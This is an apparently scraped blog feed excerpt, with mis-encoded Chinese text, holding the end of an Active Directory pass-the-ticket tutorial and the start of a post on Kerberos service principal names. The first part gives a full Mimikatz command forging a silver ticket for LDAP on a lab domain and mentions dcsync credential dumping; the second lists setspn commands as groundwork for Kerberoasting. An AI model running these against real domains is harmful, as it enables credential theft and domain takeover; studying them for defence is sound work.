&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®°å¾—æ¸…ç†ä¸‹ç³»ç»Ÿç¥¨æ®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;klist purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mimikatz:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨æˆ‘ä»¬å¼€å§‹ä½¿ç”¨ä¸Šé¢è·å–åˆ°çš„ä¿¡æ¯è¿›è¡Œä¼ªé€ é“¶ç¥¨ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/domain:hack.lab&lt;/li&gt;
&lt;li&gt;/sid:S-1-5-21-3896163557-1645138957-2306563325&lt;/li&gt;
&lt;li&gt;/target:dc.hack.lab&lt;/li&gt;
&lt;li&gt;/service:ldap&lt;/li&gt;
&lt;li&gt;/rc4:b21153e3b2ca87bc4b2031f2a9726613&lt;/li&gt;
&lt;li&gt;/user:fakeuser&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz &amp;#34;kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /target:dc.hack.lab /service:ldap /rc4:b21153e3b2ca87bc4b2031f2a9726613 /user:fakeuser /ptt&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å†æ¬¡è·å–çš„æ—¶å€™å°±èƒ½æœ‰æƒé™äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;lsadump::dcsync
å‘ DC å‘èµ·ä¸€ä¸ªåŒæ­¥å¯¹è±¡ï¼ˆå¯è·å–å¸æˆ·çš„å¯†ç ä¿¡æ¯ï¼‰çš„è´¨è¯¢ã€‚
éœ€è¦çš„æƒé™åŒ…æ‹¬ç®¡ç†å‘˜ç»„ï¼ˆAdministratorsï¼‰ï¼ŒåŸŸç®¡ç†å‘˜ç»„ï¼ˆ Domain Adminsï¼‰æˆ–ä¼ä¸šç®¡ç†å‘˜ç»„ï¼ˆEnterprise Adminsï¼‰ä»¥åŠåŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·
åªè¯»åŸŸæ§åˆ¶å™¨é»˜è®¤ä¸å…è®¸è¯»å–ç”¨æˆ·å¯†ç æ•°æ®&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x05-é˜²å¾¡&#34;&gt;0x05 é˜²å¾¡&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨å†…ç½‘ä¸­å®‰è£…æ€æ¯’è½¯ä»¶ï¼ŒåŠæ—¶æ›´æ–°ç³»ç»Ÿè¡¥ä¸&lt;/li&gt;
&lt;li&gt;å®‰è£…æµé‡ç›‘æ§è®¾å¤‡ï¼Œæ—¶åˆ»å…³æ³¨åŸŸæ§çš„æ—¥å¿—&lt;/li&gt;
&lt;li&gt;è®¡ç®—æœºè´¦æˆ·çš„è´¦æˆ·å¯†ç é»˜è®¤30å¤©æ›´æ¢ä¸€æ¬¡&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;0x06-å‚è€ƒ&#34;&gt;0x06 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets&#34;&gt;https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html&#34;&gt;https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41874930/article/details/108266378&#34;&gt;https://blog.csdn.net/qq_41874930/article/details/108266378&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bianchengquan.com/article/394332.html&#34;&gt;https://www.bianchengquan.com/article/394332.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8690&#34;&gt;https://xz.aliyun.com/t/8690&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://buaq.net/go-87488.html&#34;&gt;https://buaq.net/go-87488.html&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-SPN</title>
      <link>https://xxe.icu/ad_spn.html</link>
      <pubDate>Sun, 27 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_spn.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;SPNæ˜¯æœåŠ¡å™¨ä¸Šæ‰€è¿è¡ŒæœåŠ¡çš„å”¯ä¸€æ ‡ç¤ºï¼Œæ¯ä¸ªä½¿ç”¨Kerberosçš„æœåŠ¡éƒ½éœ€è¦ä¸€ä¸ªSPNï¼Œè¿™æ ·å®¢æˆ·ç«¯æ‰å¯ä»¥è¾¨è®¤è¿™ä¸ªæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¹‹å‰å†™çš„ä¸€ç¯‡å…³äºkerberosè®¤è¯&lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt;é‡Œé¢å°±æœ‰ç›¸å…³ä¸SPNçš„çŸ¥è¯†ï¼Œä½†æ˜¯æ²¡æœ‰å±•å¼€å†™ï¼Œè¿™é‡Œå°±è¯¦ç»†å†™ä¸€ç¯‡å…³äºSPNçš„æ–‡ç« ã€‚&lt;/p&gt;
&lt;p&gt;SPNçš„è¯†åˆ«ä¹Ÿæ˜¯Kerberoastingæ”»å‡»çš„ç¬¬ä¸€æ­¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦äº†è§£SPNæ‰å¯ä»¥å»åšç›¸å…³çš„æ”»å‡»ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±ä»åŸºç¡€æ¦‚å¿µç”±æµ…å…¥æ·±æ¥ä»‹ç»SPNã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-åŸºç¡€æ¦‚å¿µ&#34;&gt;0x01 åŸºç¡€æ¦‚å¿µ&lt;/h1&gt;
&lt;h2 id=&#34;spn-ç®€ä»‹&#34;&gt;SPN ç®€ä»‹&lt;/h2&gt;
&lt;p&gt;æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼šServicePrincipal Namesï¼‰æ˜¯æœåŠ¡å®ä¾‹ï¼ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæœåŠ¡ï¼Œæ¯”å¦‚ HTTPã€MSSQLï¼‰çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚Kerberos èº«ä»½éªŒè¯ä½¿ç”¨ SPN å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”ã€‚å¦‚æœåœ¨æ•´ä¸ªæ—æˆ–åŸŸä¸­çš„è®¡ç®—æœºä¸Šå®‰è£…å¤šä¸ªæœåŠ¡å®ä¾‹ï¼Œåˆ™æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å…·æœ‰è‡ªå·±çš„ SPNã€‚å¦‚æœå®¢æˆ·ç«¯å¯èƒ½ä½¿ç”¨å¤šä¸ªåç§°è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™ç»™å®šæœåŠ¡å®ä¾‹å¯ä»¥å…·æœ‰å¤šä¸ª SPNã€‚SPN å§‹ç»ˆåŒ…å«è¿è¡ŒæœåŠ¡å®ä¾‹çš„ä¸»æœºçš„åç§°ï¼Œå› æ­¤æœåŠ¡å®ä¾‹å¯ä»¥ä¸ºå…¶ä¸»æœºçš„æ¯ä¸ªåç§°æˆ–åˆ«åæ³¨å†Œ SPNã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœç”¨ä¸€å¥è¯æ¥è¯´æ˜çš„è¯å°±æ˜¯å¦‚æœæƒ³ä½¿ç”¨ Kerberos åè®®æ¥è®¤è¯æœåŠ¡ï¼Œé‚£ä¹ˆå¿…é¡»æ­£ç¡®é…ç½® SPNã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæ¯å°æœåŠ¡å™¨éƒ½éœ€è¦æ³¨å†Œç”¨äºKerberosèº«ä»½éªŒè¯æœåŠ¡çš„SPNå› æ­¤è¿™ä¸ºåœ¨ä¸è¿›è¡Œå¤§è§„æ¨¡ç«¯å£æ‰«æçš„æƒ…å†µä¸‹æ”¶é›†æœ‰å…³å†…ç½‘åŸŸç¯å¢ƒçš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªæ›´åŠ éšè”½çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;h2 id=&#34;spnçš„ä½œç”¨&#34;&gt;SPNçš„ä½œç”¨&lt;/h2&gt;
&lt;p&gt;å½“æŸç”¨æˆ·éœ€è¦è®¿é—®MySQLæœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šä»¥å½“å‰ç”¨æˆ·çš„èº«ä»½å‘åŸŸæ§æŸ¥è¯¢SPNä¸ºMySQLçš„è®°å½•ã€‚å½“æ‰¾åˆ°è¯¥SPNè®°å½•åï¼Œç”¨æˆ·ä¼šå†æ¬¡ä¸KDCé€šä¿¡ï¼Œå°†KDCå‘æ”¾çš„TGTä½œä¸ºèº«ä»½å‡­æ®å‘é€ç»™å®¢æˆ·ï¼Œå¹¶å°†éœ€è¦è®¿é—®çš„SPNå‘é€ç»™KDCã€‚&lt;/p&gt;
&lt;p&gt;KDCä¸­çš„TGSæœåŠ¡å¯¹TGTè¿›è¡Œè§£å¯†ã€‚ç¡®è®¤æ— è¯¯åï¼Œç”±TGSå°†ä¸€å¼ å…è®¸è®¿é—®è¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„STæœåŠ¡ç¥¨æ®å’Œè¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„åœ°å€å‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨è¯¥ç¥¨æ®å³å¯è®¿é—®MySQLæœåŠ¡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;spnç±»å‹&#34;&gt;SPNç±»å‹&lt;/h2&gt;
&lt;p&gt;SPNçš„ç±»å‹åˆ†ä¸ºä¸¤ç§ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸€ç§æ˜¯æ³¨å†Œåœ¨æ´»åŠ¨ç›®å½•çš„æœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸º Local System æˆ– Network Serviceï¼Œåˆ™SPNæ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ç§æ˜¯æ³¨å†Œåœ¨æ´»åŠ¨ç›®å½•çš„åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ï¼Œå½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸ºä¸€ä¸ªåŸŸç”¨æˆ·ï¼Œåˆ™SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸€èˆ¬æƒ³è¦åˆ©ç”¨çš„è¯éƒ½æ˜¯æ‰¾ä»¥åŸŸç”¨æˆ·èº«ä»½æ³¨å†Œçš„ï¼Œå› ä¸ºLocal Systemå’ŒNetwork Serviceæ²¡æœ‰åˆ©ç”¨ä»·å€¼ï¼Œå°±ç®—è·‘å‡ºæ¥äº†ï¼Œåœ¨è‡ªå·±çš„ç†è§£æ–¹é¢ï¼Œä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„æ–¹å‘&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCN=Computersé‚£å°±æ˜¯ä¸»æœºï¼ŒCN=Usersé‚£å°±æ˜¯åœ¨åŸŸç”¨æˆ·ä¸‹æ³¨å†Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad-spn/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;spnè¯­æ³•æ ¼å¼ä¸é…ç½®&#34;&gt;SPNè¯­æ³•æ ¼å¼ä¸é…ç½®&lt;/h2&gt;
&lt;h3 id=&#34;spnçš„è¯­æ³•æ ¼å¼&#34;&gt;SPNçš„è¯­æ³•æ ¼å¼&lt;/h3&gt;
&lt;p&gt;åœ¨ SPN çš„è¯­æ³•ä¸­å­˜åœ¨å››ç§å…ƒç´ ï¼Œä¸¤ä¸ªå¿…é¡»å…ƒç´ å’Œä¸¤ä¸ªé¢å¤–å…ƒç´ ï¼Œå…¶ä¸­&lt;code&gt;&amp;lt;service class&amp;gt;&lt;/code&gt;å’Œä¸º&lt;code&gt;&amp;lt;host&amp;gt;&lt;/code&gt;å¿…é¡»å…ƒç´ ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;serviceclass&amp;gt;/&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;service name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;service class&amp;gt;ï¼šæ ‡è¯†æœåŠ¡ç±»çš„å­—ç¬¦ä¸²
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;host&amp;gt;ï¼šæœåŠ¡æ‰€åœ¨ä¸»æœºåç§°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;port&amp;gt;ï¼šæœåŠ¡ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;service name&amp;gt;ï¼šæœåŠ¡åç§°ï¼Œæ‰€è°“çš„å®ä¾‹åç§°
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¾‹å¦‚ä¸‹é¢çš„ä¸€æ¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc(æ ‡è¯†æœåŠ¡ç±»)/SQL.hack.lab(æœåŠ¡æ‰€åœ¨ä¸»æœºåç§°):1433(æœåŠ¡ç«¯å£)/mssql(æœåŠ¡åç§°)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;ä¸»æœºåç§°&lt;/strong&gt;ï¼šå¯ä»¥åˆ†ä¸ºFQDNå’Œnetbiosï¼Œä¸€ä¸ªæ˜¯è¿è¡ŒSQL Serverçš„è®¡ç®—æœºçš„FQDNï¼ˆSQL.hack.labï¼‰ã€‚è¿˜æœ‰ä¸€ç§å°±æ˜¯SQL Serverçš„è®¡ç®—æœºçš„netbiosåå­—ï¼ˆSQLï¼‰ï¼Œä¿—ç§°çŸ­åã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç«¯å£å·/å®ä¾‹å&lt;/strong&gt;ï¼šæœåŠ¡æ‰€ç›‘å¬çš„è®¡ç®—æœºç«¯å£å·ã€‚å¯¹äºSQL Serverè€Œè¨€ï¼Œå¦‚æœSQLè¿è¡Œåœ¨é»˜è®¤ç«¯å£ï¼ˆ1433ï¼‰ä¸Šï¼Œåˆ™ç«¯å£å·å¯ä»¥çœç•¥ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver.corp.mycomany.com:1433
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver:1433
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver.corp.mycomany.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver.corp.mycomany.com:instancename
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MSSQLSvc/myserver:instancename
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æƒ³å†è¯¦ç»†äº†è§£å¯ä»¥åœ¨å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ä¸­é˜…è¯»ï¼š&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns?redirectedfrom=MSDN&#34;&gt;Name Formats for Unique SPNs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;spnçš„é…ç½®&#34;&gt;SPNçš„é…ç½®&lt;/h3&gt;
&lt;p&gt;è¿™ä¸€å—åˆ†ä¸ºSPNçš„æŸ¥è¯¢ã€æ³¨å†Œã€åˆ é™¤ç­‰æ“ä½œï¼Œæ›´è¯¦ç»†çš„å¯ä»¥æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼š&lt;a href=&#34;https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)#spn-format&#34;&gt;Setspn&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢å…¨éƒ¨å·²æ³¨å†Œçš„æ¡ç›®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn â€“q */* 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥è¯¢æŒ‡å®šåŸŸæ³¨å†Œçš„æ¡ç›®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn â€“T hack.lab â€“q */* 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥è¯¢æŒ‡å®šåŸŸç”¨æˆ·æˆ–è€…åŸŸä¸»æœºçš„æ¡ç›®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn â€“L lucky(åŸŸç”¨æˆ·)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æ‰€æœ‰åŸŸå†…çš„ç”¨æˆ·éƒ½æœ‰æƒé™æŸ¥è¯¢SPN&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¦‚æœæŸ¥è¯¢å‡ºç°ä»¥ä¸‹çš„é”™è¯¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ldap é”™è¯¯(0x31 -- æ— æ•ˆå‡­æ®): ldap_bind_sW
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ— æ³•æ£€ç´¢åŸŸâ€œâ€çš„ DN: 0x00000031
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è­¦å‘Š: æœªæŒ‡å®šæœ‰æ•ˆçš„ç›®æ ‡ï¼Œæ­£åœ¨è¿˜åŸä¸ºå½“å‰åŸŸã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ldap é”™è¯¯(0x31 -- æ— æ•ˆå‡­æ®): ldap_bind_sW
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æœç´¢ç°æœ‰ SPN æ—¶å‡ºé”™: 0x00000031
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸå› æ˜¯ï¼šåŸŸä¸»æœºæœªèƒ½å’ŒåŸŸæ§æ—¶é—´åŒæ­¥&lt;/p&gt;
&lt;p&gt;è§£å†³çš„åŠæ³•å°±æ˜¯é…ç½®åŸŸæ§çš„æ—¶é—´ä¸äº’è”ç½‘åŒæ­¥ï¼Œå¯ä»¥å‚è€ƒæ–‡ç« ï¼š&lt;a href=&#34;https://www.drpneu.com/key/%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E9%97%B4%E4%B8%8D%E5%87%86.html&#34;&gt; åŸŸæ§æœåŠ¡å™¨æ—¶é—´ä¸å‡†&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨åŸŸä¸»æœºä¸Šé…ç½®åŒæ­¥åŸŸæ§æ—¶é—´ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net time \\dc.hack.lab /set
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;æ³¨å†Œ&lt;/p&gt;
&lt;p&gt;æ–¹æ³•ä¸€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -A MSSQLSvc/SQL.hack.lab:1433 lucky
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ„æ€å°±æ˜¯è¯´æ³¨å†Œä¸€æ¡æœåŠ¡ç±»ä¸ºMSSQLSvcï¼Œä¸»æœºä¸ºSQL.hack.labï¼Œç«¯å£ä¸º1433ï¼Œæ³¨å†Œåœ¨luckyåŸŸç”¨æˆ·ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;éƒ¨åˆ†çš„æœåŠ¡ä¼šè‡ªåŠ¨å°è¯•åˆ©ç”¨è‡ªå·±çš„è´¦æˆ·è¿›è¡Œæ³¨å†ŒSPNï¼Œæ¯”å¦‚SQLServeråœ¨æ¯æ¬¡å¯åŠ¨çš„æ—¶å€™ï¼Œéƒ½ä¼šå»å°è¯•æ³¨å†ŒSPNã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ³•äºŒï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -S MSSQLSvc/SQL.hack.lab:1433 lucky
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·Ÿä¸Šé¢çš„åŒºåˆ«å°±æ˜¯ï¼Œ-Så¯ä»¥éªŒè¯æ˜¯å¦æœ‰é‡å¤çš„SPNï¼Œå¦‚æœæœ‰å°±ç¦æ­¢æ³¨å†Œã€‚å› ä¸ºå¦‚æœæœ‰é‡å¤çš„SPNä¼šå¯¼è‡´kerberosè®¤è¯çš„æ—¶å€™å¤±è´¥ï¼Œåœ¨ä¸‹é¢çš„MSSQLå®æˆ˜ä¸­ä¼šæœ‰ä¸€ä¸ªä¾‹å­ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åŸŸç®¡ç†ç”¨æˆ·å’Œæœºå™¨ç”¨æˆ·æœ¬èº«æœ‰æ³¨å†ŒSPNçš„æƒé™ï¼ŒåŸŸç”¨æˆ·æ²¡æœ‰ï¼Œå¦‚æœè¦æ³¨å†Œè¦èµ‹äºˆRead servicePrincipalNameå’ŒWrite serverPrincipalNameæƒé™&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ é™¤&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -D MSSQLSvc/SQL.hack.lab:1433 lucky
